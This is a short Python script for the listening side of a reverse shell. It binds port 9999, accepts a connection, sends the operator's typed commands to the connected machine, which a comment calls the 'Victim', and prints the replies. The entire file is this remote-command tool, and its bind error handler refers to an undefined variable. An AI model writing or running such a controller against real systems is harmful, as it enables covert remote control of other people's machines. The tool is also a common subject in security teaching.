import socket
import sys

#create socket (connect two computer)
def create_socket():
    try:
        global host
        global port
        global s
        host =""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error " + str(msg ))

#binding 
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host,port))
        s.listen(5)

    except:
        print("Socket Binding Error" + str(msg))
        bind_socket()

#Establish connection with a client (socket must listening)

def socket_accept():
    conn,address = s.accept()
    print("Connectiion has been Established! |" +" IP " + address[0] +" | Port " + str(address[1]))
    send_command(conn)
    conn.close()

#Sending Command to Friend or Victim
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0 :
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()